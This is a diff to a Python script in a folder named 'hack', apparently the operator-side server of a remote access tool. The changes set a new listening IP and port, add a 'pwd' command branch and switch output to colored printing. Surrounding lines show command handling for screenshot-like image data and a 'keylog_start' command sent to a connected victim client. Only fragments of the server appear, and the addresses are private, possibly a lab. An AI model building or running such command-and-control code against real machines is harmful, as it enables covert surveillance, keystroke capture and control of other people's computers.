@@ -2,7 +2,7 @@
 Author: hibana2077 hibana2077@gmail.com
 Date: 2024-06-04 11:00:21
 LastEditors: hibana2077 hibana2077@gmail.com
-LastEditTime: 2024-06-04 17:08:29
+LastEditTime: 2024-06-06 00:16:01
 FilePath: \hack\server_edit.py
 Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
 '''
@@ -12,7 +12,7 @@ import base64
 import datetime
 from rich import print as rprint
 
-server_ip = "10.0.2.15"
+server_ip = "172.21.0.2"
 server_port = 54321
 
 def send_data(data, connection):
@@ -73,9 +73,12 @@ while True:
             print(image_data)
     elif command.startswith("keylog_start"):
         continue
+    elif command.startswith("pwd"):
+        result = receive_data(client_connection)
+        rprint(f"[bold green]{result}[/bold green]")
     else:
         result = receive_data(client_connection)
-        print(result)
+        rprint(result)
 
 # Close connection
 rprint("[bold red]Connection closed[/bold red]")
